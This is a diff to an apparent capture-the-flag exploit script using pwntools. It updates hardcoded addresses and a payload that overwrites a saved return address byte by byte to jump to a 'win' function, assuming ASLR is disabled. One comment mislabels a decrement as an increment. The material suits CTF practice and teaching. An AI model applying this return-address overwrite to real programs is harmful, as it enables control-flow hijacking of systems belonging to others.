@@ -47,26 +47,24 @@ r = process('./chal')
 
 payload = ''
 
-# leak main
-
 key = 0x00007fffffffddc0
 retptr = 0x00007fffffffdd58
-main = 0x00005555555553b5
-win = 0x0000555555555391
+main = 0x00005555555553c5
+win = 0x00005555555553a1
 
 
-# overwrite from 0x0000555555555978 to 0x0000555555555391 cuz dw screw up stack (if no aslr)
+# overwrite from 0x00005555555559c4 to  0x00005555555553a1(if no aslr)
 
 # overwriting first byte
 payload += pushnum(retptr - key) + 'r' # move to return address
 payload += '0a' # get val
-payload += 'i' * (0x91-0x78) # increment
+payload += 'd' * (0xc4-0xa1) # increment
 payload += 'u' # overwrite
 
 # overwriting second byte
-payload += '0r' + pushnum(retptr - key+1) + 'r' # point
+payload += '0r' + pushnum(retptr - key + 1) + 'r' # move to return address
 payload += '0a' # get val
-payload += 'd' * (0x59-0x53) # decrement
+payload += 'd' * (0x59-0x53) # increment
 payload += 'u' # overwrite
 
 r.sendline(payload)
